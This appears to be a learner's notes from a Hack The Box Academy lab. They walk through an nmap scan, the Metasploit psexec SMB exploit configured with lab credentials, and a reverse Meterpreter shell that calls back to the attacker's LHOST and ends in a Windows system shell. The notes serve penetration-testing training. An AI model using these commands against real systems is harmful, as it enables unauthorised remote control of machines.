We will use pre-built `modules` and craft payloads with `MSFVenom`.

#### Starting MSF
`tylapcheong@htb[/htb]$ sudo msfconsole`

We can see there is creative ASCII art presented as the banner at launch and some numbers of particular interest.

- `2131` exploits
- `592` payloads

Let's get familiar with Metasploit payloads by using a classic `exploit module`

Remember that Metasploit can be used for more than just exploitation. We can also use different modules to scan & enumerate targets.

In this case, we will be using enumeration results from a `nmap` scan to pick a Metasploit module to use.
#### NMAP Scan
`tylapcheong@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25`

 Let's go with `SMB` (listening on `445`) as the potential attack vector.
#### Searching Within Metasploit
`msf6 > search smb`

`56 exploit/windows/smb/psexec`

|Output|Meaning|
|---|---|
|`56`|The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command `use 56` to select the module.|
|`exploit/`|This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.|
|`windows/`|This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.|
|`smb/`|This defines the service for which the payload in the module is written.|
|`psexec`|This defines the tool that will get uploaded to the target system if it is vulnerable.|


`56 exploit/windows/smb/psexec`

| Output     | Meaning                                                                                                                                                                       |
| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `56`       | The number assigned to the module in the table within the context of the search. This number makes it easier to select. We can use the command `use 56` to select the module. |
| `exploit/` | This defines the type of module. In this case, this is an exploit module. Many exploit modules in MSF include the payload that attempts to establish a shell session.         |
| `windows/` | This defines the platform we are targeting. In this case, we know the target is Windows, so the exploit and payload will be for Windows.                                      |
| `smb/`     | This defines the service for which the payload in the module is written.                                                                                                      |
| `psexec`   | This defines the tool that will get uploaded to the target system if it is vulnerable.                                                                                        |
#### Examining an Exploit's Options

Notice how this particular exploit will use a reverse TCP shell connection utilizing `Meterpreter`. A Meterpreter shell gives us far more functionality than a raw TCP reverse shell, as we established in this module's earlier sections. It is the default payload that is used in Metasploit.

We will want to use the `set` command to configure the following settings as such:


```
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

These settings will ensure that our payload is delivered to the proper target (`RHOSTS`), uploaded to the default administrative share (`ADMIN$`) utilizing credentials (`SMBPass` & `SMBUser`), then initiate a reverse shell connection with our local host machine (`LHOST`).

We know this was successful because a `stage` was sent successfully, which established a Meterpreter shell session (`meterpreter >`) and a system-level shell session. Keep in mind that Meterpreter is a payload that uses in-memory DLL injection to stealthfully establish a communication channel between an attack box and a target.

We will notice limitations with the Meterpreter shell, so it is good to attempt to use the `shell` command to drop into a system-level shell if we need to work with the complete set of system commands native to our target.

#### Interactive Shell
```
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```